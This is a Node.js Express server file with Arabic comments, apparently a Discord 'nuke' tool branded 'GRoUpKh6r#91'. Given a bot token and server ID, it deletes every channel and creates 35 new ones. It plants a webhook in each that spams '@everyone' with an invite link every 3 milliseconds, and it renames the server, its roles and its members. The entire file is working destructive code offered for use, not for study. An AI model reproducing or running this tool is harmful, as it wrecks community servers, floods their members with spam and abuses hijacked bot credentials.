// language: JavaScript, file: server.js, target: Node.js Backend
const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// خريطة لتخزين عمليات السبام وحفظ تحكم كامل بالويبهوكات
const activeSpamMap = new Map();

app.post('/api/execute', async (req, res) => {
    const { token, guildId, targetName, webhookName, spamMessage, action } = req.body;
    
    if (!token || !guildId) {
        return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
    }

    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages 
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        if (action === 'auto_nuke_spawn') {
            // 1. حذف الرومات الحالية
            const deletePromises = [];
            guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
            await Promise.all(deletePromises);

            // 2. إنشاء رومات جديدة تلقائياً مع زرع ويب هوك وبدء السبام الخارق فوراَ
            for (let i = 0; i < 35; i++) {
                guild.channels.create({ name: targetName }).then(async ch => {
                    let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
                    if (webhook) {
                        // سبام فائق السرعة لا يتوقف (كل 3 ميلي ثانية)
                        let spaming = setInterval(async () => {
                            await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91').catch(() => {});
                        }, 3);
                        activeSpamMap.set(ch.id, spaming);
                    }
                }).catch(() => {});
            }

            // 3. تعديل اسم السيرفر وتعديل أسماء الأعضاء والرتب
            await guild.setName(targetName).catch(() => {});
            guild.roles.cache.forEach(r => { if(r.editable && r.name !== '@everyone') r.setName(targetName).catch(() => {}); });
            
            guild.members.fetch().then(members => {
                members.forEach(m => m.setNickname(targetName).catch(() => {}));
            }).catch(() => {});

            res.json({ success: true, message: `[GRoUpKh6r#91] Auto-Nuke & Instant Webhook Spam deployed successfully on ${guild.name}.` });
        } else if (action === 'stop_all_spam') {
            activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
            activeSpamMap.clear();
            res.json({ success: true, message: `[GRoUpKh6r#91] All spam loops terminated.` });
        } else {
            res.json({ success: true, message: `Action executed successfully.` });
        }

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[7bl] GRoUpKh6r#91 Engine online on port ${PORT}`);
});
